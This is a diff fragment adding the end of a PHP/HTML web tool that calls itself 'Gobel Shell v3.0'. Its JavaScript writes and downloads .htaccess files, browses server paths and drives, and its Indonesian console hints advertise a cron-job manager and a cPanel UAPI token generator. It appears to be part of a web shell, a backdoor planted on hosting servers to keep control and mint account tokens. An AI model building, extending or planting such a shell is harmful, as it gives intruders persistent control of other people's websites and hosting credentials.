@@ -1,0 +1,45 @@
+$('#htGenerate').onclick = () => htGenerate(false);
+$('#htWrite').onclick = () => {
+  if (!confirm('Write .htaccess to the target directory? A backup of the existing file (.htaccess.gobel.bak) will be created if present.')) return;
+  htGenerate(true);
+};
+$('#htCopy').onclick = async () => {
+  if (!htLastContent) { toast('Generate a preview first', 'error'); return; }
+  try { await navigator.clipboard.writeText(htLastContent); toast('Copied to clipboard', 'ok'); }
+  catch (e) {
+    const ta = document.createElement('textarea'); ta.value = htLastContent;
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
+    toast('Copied to clipboard', 'ok');
+  }
+};
+$('#htDownload').onclick = () => {
+  if (!htLastContent) { toast('Generate a preview first', 'error'); return; }
+  const blob = new Blob([htLastContent], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = '.htaccess';
+  document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+};
+
+const initPath = new URLSearchParams(location.search).get('path') || '';
+if (initPath) {
+    navigate(initPath);
+} else {
+    S.path = '';
+    renderBreadcrumb();
+    navigate('');
+}
+
+loadInfo();
+loadDrives();
+navigate(initPath);
+
+console.log('🐚 Gobel Shell v3.0 — Cron UI + UAPI Token Ready');
+console.log('📌 Gunakan: sbCronUI → Cron Jobs Manager (cPanel-like)');
+console.log('📌 Gunakan: sbUapi → cPanel UAPI Token Generator');
+</script>
+</body>
+</html>
+<?php
+// END
